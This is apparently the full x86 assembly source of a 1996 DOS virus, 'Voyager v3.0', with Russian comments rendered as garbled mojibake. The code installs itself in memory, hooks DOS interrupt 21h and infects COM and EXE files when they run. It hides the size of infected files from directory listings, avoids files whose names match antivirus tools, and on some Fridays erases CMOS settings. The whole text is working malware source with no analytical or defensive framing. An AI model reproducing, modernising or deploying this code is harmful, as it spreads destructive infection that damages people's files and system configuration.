   .MODEL TINY
   .CODE
   .STARTUP
   JUMPS

   Vir_Len     equ End_of_Vir-VStart ;‡¤¥áì ¤«¨  ¢¨àãá 
   Name_Count  equ (Offset Name_Len - Offset Spec_Name)/4


   VStart:
       cld
       push    ds es

       call    $+3
       pop bp          ;„¥« ¥¬  ¤à¥á æ¨î ç¥à¥§ bp
       sub bp,offset $-1       ;â.¥. ¤«¨  ä ©« +á¬¥é¥¨¥ ¯® ¢¨àãáã
                       ;*â® ã¦® ¤«ï â®£® çâ®¡ë ¢¨àãá ¬®£ ¢
                       ;ä ©«¥ à ¡®â âì
   ;•¥-å¥

       mov ah,2ah
       int 21h

       cmp al,5            ; Friday - it's a dark day
       jne @@Skip

       cmp dl,dh
       jae @@Skip

       in  al,40h
       cmp al,16
       ja  @@Skip

   Delete_CMOS:

       xor ch,ch
       mov cl,1ah
   Loop1:
       mov al,cl
       out 70h,al
       jmp $+2
       mov al,0
       out 71h,al
       loop    Loop1

   @@Skip:

   ;*à®¢¥àª  ¯ ¬ïâ¨   ¢¨àãá
       mov ax,0DEADh
       int 21h
       cmp ax,00DAh
       jz  Installed   ;“¦¥ ¢ ¯ ¬ïâ¨


   ;Žáâ ¢«ï¥¬ ¢¨àãá à¥§¨¤¥âë¬

   Stay_At_Memory:

           mov     ax,ds                   ; Š®àà¥ªâ¨àã¥¬ MCB
           push    ax
       dec     ax
       push    ax          ; ’¥¯¥àì ¢ ax -> MCB
           mov     ds,ax
       cmp byte ptr ds:[0],'Z'
       je  Last_Block
       adc ax,word ptr ds:[03]
       mov ds,ax
   Last_Block:
           mov     cl,4
           mov     dx,2*Vir_len+3000
           shr     dx,cl           ;*¥à¥¢®¤¨¬ ¢ ¯ à £à äë

           sub     word ptr ds:[03h],dx    ; * §¬¥à MCB
       sub     word ptr ds:[12h],dx    ; * §¬¥à ¯®¤ ¯à®£ã ¢ PSP

       ;Š®àà¥ªæ¨ï ¯ ¬ïâ¨ ¯®¤ BIOS
       mov cl,6
       shr dx,cl
       mov ax,0
       mov ds,ax
       inc dx
       sub word ptr ds:[413h],dx
       pop ds ax

           add     ax,word ptr ds:[03h]

           inc     ax                      ; es:di= ¤à¥á ª®¤  à¥§¨¤¥â 
           mov     es,ax
       sub di,di
           lea     si,[bp+VStart]
           mov     cx,Vir_Len
           repnz   movs byte ptr es:[di],cs:[si] ; Š®¯¨àã¥¬ ¢ ¯ ¬ïâì ds:si -> es:di

           push    es
       pop ds

   ;‘®åà ï¥¬ áâ àë© 21h ¢¥ªâ®à

       mov ax,3521h        ; Int 21h
       int 21h

       mov word ptr ds:[Old_21-100h],bx
       mov word ptr ds:[Old_21-100h+2],es

   ;“áâ  ¢«¨¢ ¥¬ á¢®© 21 ¢¥ªâ®à

       mov ax,2521h            ; Int 21h
       lea dx,[New_21-100h]
       int 21h

   ;‚®ááâ  ¢«¨¢ ¥¬ áâ àë© § £®«®¢®ª ä ©« 

   Installed:
       pop es ds
       cmp word ptr cs:[bp+Old_Header],'ZM'
       je  EXE_Exit

       lea si,[bp+Old_Header]
       mov di,100h
       mov cx,6
       repnz   movsb
       mov ax,100h
       jmp ax
   EXE_Exit:
       mov ax,ds
       add ax,10h
       add word ptr cs:[bp+Old_CS+2],ax
       add word ptr cs:[bp+Old_SS+2],ax
       cli
       mov ss,word ptr cs:[bp+Old_SS+2]
       mov sp,word ptr cs:[bp+Old_SS]
       sti

       jmp dword ptr cs:[bp+Old_CS]

   include     $UPD21.INC
   Virii_ID    db  'ûoyager v3.0 (ü) 1996 by Shy Guy & Lost Soul. '
           db  '‘«ãè ©â¥ Canibal Corps ¨ ¢ è¨ ¢®«®áë ¡ã¤ãâ '
           db  '¬ï£ª¨¬¨ ¨ è¥«ª®¢¨áâë¬¨! Lamerz must die'
   ;*******************************************************************************
   ;           *…‡ˆ„…*’*€Ÿ —€‘’œ ‚ˆ*“‘€
   New_21:
       cmp ax,0DEADh   ;*à®¢¥àª    à¥§¨¤¥â®áâì
       jne Continue
       mov ax,00DAh
       iret

   Continue:
       push    bp ax bx cx dx si di ds es
       call    $+3
       pop bp      ;’ ª¦¥ ¤¥« ¥¬  ¤à¥á æ¨î ç¥à¥§ bp ¢ ®¯¥à â¨¢ª¥
       sub bp,Offset $-1

       cmp ax,4b00h    ;”ãªæ¨ï Exec
       jz  Infect
       cmp ah,4eh
       jz  Stealth_1
       cmp ah,4fh
       je  Stealth
       jmp Continue1

   Jmp21h:
       xor ax,ax
       mov ds,ax
       mov ax,word ptr cs:[bp+Old24_Ofs]
       mov word ptr ds:[24h*4],ax
       mov ax,word ptr cs:[bp+Old24_Seg]
       mov word ptr ds:[24h*4+2],ax

   Continue1:
       pop es ds di si dx cx bx ax bp
       db  0eah
   Old_21  dd  ?

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   Stealth_1:
       push    ax cx dx

       push    cs
       pop es
       call    Insert_Name
       mov cx,di
       cmp cx,dx
       lea di,[bp+End_of_Vir]
       je  Skip_Copy

       sub cx,dx
       mov al,cl
       stosb
       mov si,dx
       cld
       repnz   movsb
       jmp Copied

   Skip_Copy:
       xor ax,ax
       stosb
   Copied:
       pop dx cx ax
   Stealth:
       pushf           ;‚ë§ë¢ ¥¬ FindFirst/FindNext
       call    dword ptr cs:[bp+Old_21]
       jc  Carry_Exit

       mov ah,2fh      ;H å®¤¨¬ â¥ªãéãî DTA
       int 21h

       push    es
       pop ds

       test    byte ptr [bx+15h],11000b    ; H¥ ®¡p ¡ âë¢ âì:
       jnz _Exit       ; ¤¨p¥ªâ®p¨¨ ¨ ¬¥âªã â®¬ 

       mov si,bx       ;Save es:bx to es:si-----> Old DTA
       mov word ptr cs:[bp+DTA_SEG],es
       push    si

       add si,1eh      ;ds:dx - pointer to name @ DTA
       push    cs
           pop es
       lea di,[bp+End_of_Vir]
       mov al,byte ptr es:[di]
       inc di
       and al,al
       jz  Dir_Absent
       sub ah,ah
       add di,ax
   Dir_Absent:
       lodsb
       stosb
       and al,al
       jnz Dir_Absent

       push    cs
       pop ds si

       cmp word ptr [di-4],'XE'        ; “áâ  ¢«¬¢ ¥¬ áâ¥«á ¤«ï EXE
       jz  Stealth_On
       cmp word ptr [di-4],'OC'        ; ¨ COM ä ©«®¢
       jne _Exit

   Stealth_On:
       mov ax,3d00h
       lea dx,[bp+End_of_Vir+1]
       int 21h
       jc  _Exit
       mov bx,ax

       push    cs
       pop ds
       mov ah,3fh      ;—¨â ¥¬ ¯¥p¢ë¥ 14h ¡ ©â § £®«®¢ª 
       lea dx,[bp+Old_Header]
       mov cx,14h
       int 21h

       mov di,dx
       cmp byte ptr [di+3],'û'
       je  Truncate
       cmp word ptr [di+12h],'Ov'
       je  EXE_Truncate

   Exit_&_Close:
       mov ah,3eh
       int 21h

   _Exit:
       pop es ds di si dx cx bx ax bp

       iret

   Carry_Exit:
       mov bp,sp
       or  byte ptr [bp+22],1  ; ‚ëå®¤ á Carry Flag
       jmp _Exit

   EXE_Truncate:
       mov ax,word ptr [di+10h]
       sub ax,(2*Vir_Len)+4200h
       jmp @@Here
   Truncate:
       mov ax,word ptr [di+4]
   @@Here:
       mov dx,1234h
   DTA_SEG =   $-2
       mov ds,dx
       sub word ptr [si+1ah],ax
       sbb word ptr [si+1ch],0
       jmp Exit_&_Close

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   Infect:
       cld
       push    ds
       xor ax,ax
       mov ds,ax
       mov ax,word ptr ds:[24h*4]
       mov word ptr cs:[bp+Old24_Ofs],ax
       mov ax,word ptr ds:[24h*4+2]
       mov word ptr cs:[bp+Old24_Seg],ax
       mov word ptr ds:[24h*4],Offset Handler24
       mov word ptr ds:[24h*4+2],cs
       pop ds

       call    Insert_Name
       mov si,di
       push    si
       call    UpCase
       pop si  ;ds:si=File name

       push    cs
       pop es  ;es:di=Names of special names
       lea di,[bp+Spec_Name]

       mov cx,Name_Count
   Cyc@@1:
       push    cx si di
       mov cx,4
       repe    cmpsb
       pop di si cx
       jz  Jmp21h
       add di,4
       loop    Cyc@@1

       lodsw
       cmp ax,'V-'
       je  Jmp21h
       cmp ax,'EW'
       je  Jmp21h

   Name_Ok:
       mov ax,3d02h
       int 21h
       jc  Errors

       mov bx,ax
       push    cs cs
       pop ds es
       mov ax,5700h
       int 21h
       mov word ptr cs:[bp+Old_File_Time],cx
       mov word ptr cs:[bp+Old_File_Date],dx

       mov ah,3fh          ;‘ç¨âë¢ ¥¬ § £®«®¢®ª ä ©« 
       mov cx,18h
       lea dx,[bp+Old_Header]
       int 21h
       jc  Errors

       mov si,dx
       cmp word ptr [si],'ZM'
       jz  EXE

       cmp byte ptr [si+3],'û' ;Already infected
       je  Errors

       mov al,2            ;Goto EOF
       call    Lseek

                       ;Check file size
       cmp ax,1024
       jbe Errors          ;Close if file is short
       cmp ax,58000
       jae Errors          ;Close if file is big

       sub ax,3
       mov word ptr cs:[bp+New_Header+1],ax ;Create new header

       lea si,[bp+VStart]
       lea di,[bp+End_of_Vir]
       mov cx,Vir_Len

       call    $UPD

       mov word ptr cs:[bp+New_Header+4],cx

       mov dx,di
       call    Write_Data      ;Write virus body to EOF

       mov al,0
       call    Lseek

       mov cx,6
       lea dx,[bp+New_Header]
       call    Write_Data      ;Write new header to file
       jmp Repair          ;‡ ªàë¢ ¥¬ ä ©«


   Lseek:
       mov ah,42h          ;*à®æ¥¤ãà  ¯®§¨æ¨®¨à®¢ ¨ï
       xor cx,cx           ;ãª § â¥«ï
       xor     dx,dx
       int 21h
       ret

   Write_Data:
       mov ah,40h
       int 21h
       ret

   Repair:
       mov ax,5701h
       mov cx,word ptr cs:[bp+Old_File_Time]
       mov dx,word ptr cs:[bp+Old_File_Date]
       int 21h

   Errors:
       mov ah,3eh
       int 21h
       jmp Jmp21h

   EXE:
       cmp word ptr cs:[si+12h],'Ov'       ;Already infected
       je  Errors

       mov al,2
       call    Lseek
       mov word ptr cs:[bp+F_Len],dx

       push    ax dx ax dx
       cmp ax,1024
       jbe Errors
       cmp dx,8
       ja  Errors

       mov word ptr [si+12h],'Ov'      ;VirusID
       mov ax,word ptr [si+14h]
       mov word ptr cs:[bp+Old_CS],ax  ;Save old cs:ip
       mov ax,word ptr [si+16h]
       mov word ptr cs:[bp+Old_CS+2],ax
       mov ax,word ptr [si+10h]        ;Save old ss:sp
       mov word ptr cs:[bp+Old_SS],ax
       mov ax,word ptr [si+0eh]
       mov word ptr cs:[bp+Old_SS+2],ax

       pop dx ax

       mov cx,10h      ;Make new code entry
       div cx

       sub ax,word ptr [si+8h] ;Here new cs:ip
       sbb dx,0
       mov word ptr [si+14h],dx

       mov word ptr [si+16h],ax
                       ;Here new ss:sp
       mov word ptr [si+0eh],ax
       mov word ptr [si+10h],(Vir_Len*2)+4200h

       push    si

       lea si,[bp+VStart]
       lea di,[bp+End_of_Vir]
       mov cx,Vir_Len
       call    $UPD
       pop si
       add word ptr [si+10h],cx
       mov word ptr cs:[bp+ADD_Addr],cx
       mov dx,di
       call    Write_Data

       pop dx ax
       sub dx,dx
       add ax,1234h
   ADD_Addr    =   $-2
       adc dx,word ptr cs:[bp+F_Len]

       mov cx,200h
       div cx

       mov word ptr [si+2],dx
       inc ax
       mov word ptr [si+4],ax

       mov al,0
       call    Lseek

       lea dx,[bp+Old_Header]
       mov cx,18h
       call    Write_Data
       jmp Repair

   Handler24:
       mov al,3
       iret

   ; ‚å®¤: ds:dx=¯ãâì ª ä ©«ã
   ; ‚ëå®¤: ds:di=¨¬ï ä ©« 

   Insert_Name:
       mov si,dx
       mov di,dx

   Rep_Find_Name:
       lodsb
       cmp al,'\'
       jne @@Pass1
       mov di,si
   @@Pass1:
       cmp al,':'
       jne @@Pass2
       mov di,si
   @@Pass2:
       or  al,al
       jnz Rep_Find_Name

       retn

   ; ‚å®¤: ds:si=¯ãâì ª ä ©«ã

   UpCase:
   Rep_UpCase:
       lodsb
       cmp al,'a'
       jb  Not_Upcase
       cmp al,'z'
       ja  Not_Upcase
       xor al,' '
   Not_Upcase:
       stosb
       test    al,al
       jnz Rep_UpCase

       retn
   Spec_Name   db  'AIDS','ANTI','DRWE','MSAV','COMM','ADIN'
   Name_Len    =   $
   Old_File_Time   dw  ?
   Old_File_Date   dw  ?
   F_Len       dw  ?
   Old_CS      dd  ?
   Old_SS      dd  ?
   Old24_Ofs   dw  ?
   Old24_Seg   dw  ?
   Real_Len    dw  ?
   New_Header  db  0E9h,0,0,'û'
   Old_Header  db  0cdh,20h,?,?,14h dup('F')

   End_of_Vir:

           end
